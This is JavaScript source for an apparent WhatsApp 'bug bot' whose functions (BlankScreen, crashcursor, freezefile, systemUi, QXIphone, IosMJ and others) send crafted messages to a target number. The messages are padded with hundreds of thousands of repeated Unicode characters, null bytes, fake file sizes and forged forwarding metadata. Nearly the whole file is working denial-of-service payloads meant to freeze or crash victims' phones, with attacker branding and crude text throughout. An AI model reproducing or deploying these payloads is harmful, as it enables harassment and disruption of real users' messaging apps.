              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath:
                    "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
async function BlankScreen(target, Ptcp = false) {
  let virtex =
    "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦽ".repeat(45000) + "@13135550002".repeat(50000);
  await cay.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "Halo🤗",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath:
                  "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
              },
              hasMediaAttachment: true,
            },
            body: {
              text: virtex,
            },
            nativeFlowMessage: {
              name: "call_permission_request",
              messageParamsJson: "\u0000".repeat(5000),
            },
            contextInfo: {
              mentionedJid: ["13135550002@s.whatsapp.net"],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "Bokep 18+",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath:
                    "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
                },
              },
            },
          },
        },
      },
    },
    Ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
  console.log(chalk.red.bold("🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿"));
}
const tredict = fs.readFileSync("./tredict.jpg");
const tdxlol = fs.readFileSync("./tdx.jpeg");
const crypto = require("crypto");
async function crashcursor(target, ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0000" + "ꦽ".repeat(45000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: cay.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '- Kami Yo "👋"',
                footerText: "© Caywzz",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: tdxlol,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/devor6core",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! Starevxz - "𝗋34" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              thumbnail: tdxlol,
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `- Caywzz 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : Caywzz ",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await cay.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
async function freezefile(target, QBug, Ptcp = true) {
  let virtex = "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦾ".repeat(250000) + "@0".repeat(250000);
  await cay.relayMessage(
    target,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "Wkwk.",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath:
                  "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
              title: "",
              hasMediaAttachment: true,
            },
            body: {
              text: virtex,
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
              groupMentions: [
                { groupJid: "0@s.whatsapp.net", groupSubject: "anjay" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
    { messageId: null }
  );
}
async function buginvite(target, ptcp = true) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: `33333333333333333@newsletter`,
            newsletterName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦾ".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
            inviteExpiration: Date.now() + 1814400000, // 21 hari
          },
        },
      },
      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}",
          },
          {
            name: "galaxy_message",
            paramsJson: {
              screen_2_OptIn_0: true,
              screen_2_OptIn_1: true,
              screen_1_Dropdown_0: "nullOnTop",
              screen_1_DatePicker_1: "1028995200000",
              screen_1_TextInput_2: "null@gmail.com",
              screen_1_TextInput_3: "94643116",
              screen_0_TextInput_0: "\u0000".repeat(500000),
              screen_0_TextInput_1: "SecretDocu",
              screen_0_Dropdown_2: "#926-Xnull",
              screen_0_RadioButtonsGroup_3: "0_true",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s.",
            },
          },
        ],
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
        groupMentions: [
          {
            groupJid: "0@s.whatsapp.net",
            groupSubject: "caywzz",
          },
        ],
      },
    };

    await cay.relayMessage(target, message, {
      userJid: target,
    });
  } catch (err) {
    console.error("Error sending newsletter:", err);
  }
}
async function crashUiV5(target, Ptcp = false) {
  cay.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "@0".repeat(250000) + "ꦾ".repeat(100000),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "call_permission_request",
                  buttonParamsJson: {},
                },
              ],
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
              groupMentions: [
                {
                  groupJid: "0@s.whatsapp.net",
                  groupSubject: "Caywzz",
                },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target }, messageId: null }
  );
}
async function systemUi(target, Ptcp = false) {
  cay.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "ꦾ".repeat(250000) + "@0".repeat(100000),
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
              groupMentions: [
                { groupJid: "0@s.whatsapp.net", groupSubject: "Caywzz" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target }, messageId: null }
  );
}
async function systemUi2(target, Ptcp = false) {
  cay.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "ꦾ".repeat(250000) + "@0".repeat(100000),
            },
            nativeFlowMessage: {
              messageParamsJson: "Caywzz",
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson:
                    '{"display_text":"Caywzz!","id":".groupchat"}',
                },
                {
                  name: "single_select",
                  buttonParamsJson: {
                    title: "Caywzz",
                    sections: [
                      {
                        title: "Caywzz",
                        rows: [],
                      },
                    ],
                  },
                },
              ],
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
              groupMentions: [
                { groupJid: "0@s.whatsapp.net", groupSubject: "Caywzz" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target }, messageId: null }
  );
}
async function crashui2(target, ptcp = false) {
  await cay.relayMessage(
    target,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "\u0000" + "ꦾ".repeat(300000) + "@1".repeat(300000),
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [
                { groupJid: "1@newsletter", groupSubject: " xCeZeT " },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
    { messageId: null }
  );
}
async function sendOfferCall(target) {
  try {
    await cay.offerCall(target);
    console.log(chalk.white.bold(`Success Send Offer Call To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
  }
}
async function InVisiLoc(target, ptcp = false) {
  let etc = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
                address: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                jpegThumbnail: o,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
              buttons: [
                {
                  name: "call_permission_request",
                  buttonParamsJson: {},
                },
              ],
            },
          },
        },
      },
    }),
    {
      userJid: target,
      quoted: QBug,
    }
  );
  await cay.relayMessage(
    target,
    etc.message,
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
  console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
}
async function bokep(target, ptcp = false) {
  await cay.relayMessage(
    target,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
            },
            body: {
              text: "Wanna With Yours. :D" + "ꦾ".repeat(3),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson:
                    '{"display_text":"YouTube 🍒","url":"https://youtube.com/@dgxeon","merchant_url":"https://www.google.com"}',
                },
                {
                  name: "cta_url",
                  buttonParamsJson:
                    '{"display_text":"Telegram 💙","url":"https://t.me/+WEsVdEN2B9w4ZjA9","merchant_url":"https://www.google.com"}',
                },
                {
                  name: "quick_reply",
                  buttonParamsJson:
                    '{"display_text":"Owner 👤","title":"Owner 👤","id":".owner"}',
                },
              ],
              messageParamsJson: '{"caption":"Halo"}',
            },
            contextInfo: {
              mentionedJid: ["6285727763935@s.whatsapp.net"],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
    { messageId: null }
  );
}
async function sendContact(target) {
  const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:Caywzz\nTEL:+6289673110783\nEND:VCARD`;

  await cay.relayMessage(
    target,
    {
      contactMessage: {
        contacts: [
          {
            displayName: "Caywzz",
            jid: "+6289673110783@s.whatsapp.net",
            vcard: vcard,
          },
        ],
      },
    },
    { participant: { jid: target } },
    { messageId: null }
  );
}
//bug ios
async function UpiCrash(target) {
  await cay.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function VenCrash(target) {
  await cay.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "VENMO",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function AppXCrash(target) {
  await cay.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "CASHAPP",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function SmCrash(target) {
  await cay.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "SAMSUNGPAY",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function SqCrash(target) {
  await cay.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "SQUARE",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function FBiphone(target) {
  await cay.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "FBPAY",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function QXIphone(target) {
  let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
  await cay.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 999.03499999999999,
        degreesLongitude: -999.03499999999999,
        name: CrashQAiphone,
        url: "https://t.me/xatanicvxii",
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function caywzzaja_notif(target) {
  await cay.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "\u0000",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath:
                  "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: "https://i.top4top.io/p_32261nror0.jpg",
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "ꦾ".repeat(250000) + "@0".repeat(100000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{}",
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 10000,
                  },
                  () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "\u0000",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath:
                    "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function QPayIos(target) {
  await cay.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "PAYPAL",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function QPayStriep(target) {
  await cay.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "STRIPE",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function QDIphone(target) {
  cay.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "ꦾ".repeat(55000),
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}
async function invccombine(target, ptcp = true) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "xatanicvxii",
              hasMediaAttachment: false,
            },
            body: {
              text: `🌌`,
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await cay.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
//

async function IosMJ(target, Ptcp = false) {
  await cay.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "Wanna With Yours :)" + "ꦾ".repeat(90000),
        contextInfo: {
          stanzaId: "1234567890ABCDEF",
          participant: "0@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: "1",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [
                {
                  jid: "0@s.whatsapp.net",
                  callOutcome: "1",
                },
              ],
            },
          },
          remoteJid: target,
          conversionSource: "source_example",
          conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
          conversionDelaySeconds: 10,
          forwardingScore: 99999999,
          isForwarded: true,
          quotedAd: {
            advertiserName: "Example Advertiser",
            mediaType: "IMAGE",
            jpegThumbnail:
              "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAA